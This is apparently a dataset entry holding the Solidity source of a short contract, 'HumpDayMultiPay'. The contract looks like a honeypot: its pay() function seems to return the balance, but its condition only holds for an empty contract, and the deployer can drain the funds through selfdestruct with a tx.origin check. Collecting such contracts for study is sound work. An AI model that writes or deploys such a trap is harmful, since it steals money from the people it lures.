  "source": "\n\ncontract HumpDayMultiPay\n{\n    address O = tx.origin;\n\n    function() public payable {}\n\n    function pay() public payable {\n        if (msg.value >= this.balance) {\n            tx.origin.transfer(this.balance);\n        }\n    }\n    function fin() public {\n        if (tx.origin == O) {\n            selfdestruct(tx.origin);\n        }\n    }\n }",
